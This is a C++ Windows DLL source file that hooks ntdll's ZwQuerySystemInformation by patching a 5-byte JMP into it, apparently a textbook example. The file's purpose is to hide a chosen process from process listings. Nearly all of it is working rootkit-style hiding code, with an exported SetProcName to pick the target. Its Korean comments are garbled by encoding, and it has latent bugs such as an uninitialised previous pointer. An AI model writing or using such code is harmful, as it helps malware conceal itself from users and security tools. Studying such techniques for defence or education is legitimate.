// dllmain.cpp : DLL ���� ���α׷��� �������� �����մϴ�.
#include "stdafx.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37, SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	BYTE Reserved1[48];
	PVOID Reserved2[3];
	HANDLE UniqueProcessId;
	PVOID Reserved3;
	ULONG HandleCount;
	BYTE Reserved4[4];
	PVOID Reserved5[11];
	SIZE_T PeakPagefileUsage;
	SIZE_T PrivatePageCount;
	LARGE_INTEGER Reserved6[6];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
PVOID SystemInformation,
ULONG SystemInformationLength,
PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// Global Variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
char g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// Global Variable
BYTE g_pOrgBytes[5] = { 0, };


BOOL hook_by_code(LPCTSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;

	// ��ŷ ��� API �ּҸ� ���Ѵ�
	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandle(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;

	// ���� �̹� ��ŷ �Ǿ� �ִٸ� return FALSE
	if (pByte[0] == 0xE9)
		return FALSE;

	// 5 byte ��ġ�� ���Ͽ� �޸𸮿� WRITE �Ӽ� �߰�
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// ���� �ڵ� (5 byte) ���
	memcpy(pOrgBytes, pfnOrg, 5);

	// JMP �ּ� ��� (E9 XXXX)
	// => XXXX = pfnNew - pfnOrg - 5
	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	// Hook - 5 byte ��ġ (JMP XXXX)
	memcpy(pfnOrg, pBuf, 5);

	// �޸� �Ӽ� ����
	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(LPCTSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;

	// API �ּ� ���Ѵ�
	pFunc = GetProcAddress(GetModuleHandle(szDllName), szFuncName);

	// ���� �ڵ�(5 byte)�� ����� ���� �޸𸮿� WRITE �Ӽ� �߰�
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	// Unhook
	memcpy(pFunc, pOrgBytes, 5);

	// �޸� �Ӽ� ����
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev;
	char szProcName[MAX_PATH] = { 0, };

	// �۾� ���� unhook
	unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);

	// original API ȣ��
	pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"),
		"ZwQuerySystemInformation");
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
		SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;

	// SystemProcessInformation �� ��츸 �۾���
	if (SystemInformationClass == SystemProcessInformation)
	{
		// SYSTEM_PROCESS_INFORMATION Ÿ�� ĳ����
		// pCur �� single linked list �� head
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		while (TRUE)
		{
			// wide character => multi byte ��ȯ
			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1],
				-1, szProcName, MAX_PATH, NULL, NULL);

			// ���μ��� �̸� ��
			// g_szProcName = �����Ϸ��� ���μ��� �̸�
			// (=> SetProcName() ���� ���õ�)
			if (!_strcmpi(szProcName, g_szProcName))
			{
				// ���� ����Ʈ���� ���� ���μ��� ����
				if (pCur->NextEntryOffset == 0)
					pPrev->NextEntryOffset = 0;
				else
					pPrev->NextEntryOffset += pCur->NextEntryOffset;
			}
			else
				pPrev = pCur;

			if (pCur->NextEntryOffset == 0)
				break;

			// ���� ����Ʈ�� ���� �׸�
			pCur = (PSYSTEM_PROCESS_INFORMATION)
				((ULONG)pCur + pCur->NextEntryOffset);
		}
	}

__NTQUERYSYSTEMINFORMATION_END:

	// �Լ� ���� ���� �ٽ� API Hooking
	hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
		(PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	char            szCurProc[MAX_PATH] = { 0, };
	char            *p = NULL;

	// #1. ����ó�� : ���� ���μ����� WhoRU.exe ��� ��ŷ���� �ʰ� ����
	GetModuleFileName(NULL, (LPWSTR)szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !_stricmp(p + 1, "WhoRU.exe"))
		return TRUE;

	switch (fdwReason)
	{
		// #2. API Hooking
	case DLL_PROCESS_ATTACH:
		hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
			(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;

		// #3. API Unhooking 
	case DLL_PROCESS_DETACH:
		unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
			g_pOrgBytes);
		break;
	}

	return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
	{
		strcpy_s(g_szProcName, (const char *)szProcName);
	}
#ifdef __cplusplus
}
#endif